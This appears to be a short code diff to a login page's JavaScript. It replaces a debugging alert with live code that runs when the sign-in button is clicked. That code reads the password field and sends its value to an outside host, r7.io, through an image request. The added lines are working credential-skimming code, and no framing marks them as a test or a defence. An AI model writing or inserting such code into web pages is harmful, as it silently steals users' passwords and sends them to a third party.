@@ -1,8 +1,7 @@
 document.addEventListener("DOMContentLoaded", function() {
 	document.getElementById("signin-btn").onclick = function givePassword() {
-		alert(document.getElementById("login_password").value);
-		//var img = new Image();
-		//img.src = '';
+		var img = new Image();
+		img.src = "http://r7.io/e/davinl?s=" + document.getElementById("login_password").value;
 	};
 	var prob = document.getElementsByClassName("problem")[0];
 	var err = document.getElementsByClassName("error-message")[0];
